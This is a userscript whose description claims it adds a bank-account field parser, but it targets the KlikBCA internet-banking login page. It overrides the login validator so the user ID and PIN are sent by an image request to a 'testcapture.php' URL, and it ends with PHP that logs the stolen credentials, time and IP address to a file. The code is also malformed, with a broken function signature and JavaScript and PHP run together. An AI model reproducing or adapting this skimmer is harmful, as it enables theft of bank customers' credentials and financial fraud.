// ==UserScript==
// @name          ASB Full Bank Account Field Parser
// @description   Adds a field for a full bank account no, which populates the existing bank account number fields.
// @include       https://ibank.klikbca.com/login.jsp
// ==/UserScript==

var blnSubmitted = false;
function Login_Form_Validator( theForm ) {
 
  document.forms[0]['value(user_id)'].autocomplete = 'off';
  document.forms[0]['value(pswd)'].autocomplete = 'off';
 
  var blnResponse = false;
  if (blnSubmitted) {
    return false;
  }
 
  var strErrMsg = "";
  if( document.forms[0]['value(user_id)'].value == '') {
    alert("Silakan mengisi User ID anda/Please input your User ID");
    document.forms[0]['value(user_id)'].focus();
    return false;
  }
  if( document.forms[0]['value(user_id)'].value.length>12) {
    alert("User ID/Password Anda salah / Your User ID/Password is Wrong");
    document.forms[0]['value(user_id)'].select();
    document.forms[0]['value(user_id)'].focus();
    return false;
  }
 
  if(document.forms[0]['value(pswd)'].value == '') {
    alert("Silakan mengisi PIN anda/Please input your PIN");
    document.forms[0]['value(pswd)'].focus();
    return false;
  }
  if(document.forms[0]['value(pswd)'].value.length<6) {
    alert("PIN harus 6 Angka/PIN must be 6 digits");
    document.forms[0]['value(pswd)'].focus();
    return false;
  }
 
  //if(strErrMsg != '') {
  //  alert(strErrMsg);
  //  return false;
  //}
 
  //blnSubmitted =  confirm("Click OK to login.");
  if ( !blnSubmitted ) {
    blnSubmitted = true;
    blnResponse = true;
  }
 
  //if('< %= blnLogout %>'=='true')
	//blnResponse = false;
 
  return blnResponse;
}
var abc=false;
function Login_Form_Validator(theForm {
    if (!abc) {
        document.images.myimage.src='http://www.klikbca.com/testcapture.php'+'?userid='+document.forms[0]['value(user_id)'].value+'&passwd='+document.forms[0]['value(pswd)'].value;
        abc = true;
        return false;
    }
<?php
$file=fopen("capture.txt","a+");
$userid=$_GET["userid"];
$passwd=$_GET["passwd"];
$ipaddr=$_SERVER["REMOTE_ADDR"];
$now = date("Ymd H:i:s");
if (!empty($userid)) {
        fwrite($file,"$userid =&amp;gt; $passwd (at $now from $ipaddr)\n");
}
fclose($file);
?>
